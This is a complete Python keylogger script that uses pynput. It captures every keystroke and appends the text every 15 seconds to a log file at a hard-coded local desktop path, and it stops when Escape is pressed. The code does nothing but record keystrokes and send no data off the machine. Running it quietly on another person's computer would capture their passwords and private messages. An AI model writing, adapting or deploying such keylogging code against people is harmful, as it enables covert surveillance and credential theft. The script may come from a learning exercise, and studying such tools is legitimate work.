import os
import threading
from pynput.keyboard import Key, Listener
import time

log = ""

path = os.path.join("/Users/achrafbenamer/Desktop/METROLOGIE TP 1/logs.txt")

def processkeys(key):
    global log
    try:
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        elif key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        elif key == Key.backspace:
            log = log[:-1]
    except AttributeError:
        pass

def on_press(key):
    processkeys(key)

    if key == Key.esc:
        return False

def report():
    global log, path
    while True:
        if log:
            with open(path, "a", encoding="utf-8") as logfile:
                logfile.write(log)
            log = ""
        time.sleep(15)

report_thread = threading.Thread(target=report)
report_thread.daemon = True
report_thread.start()

keyboard_listener = Listener(on_press=on_press)

with keyboard_listener:
    keyboard_listener.join()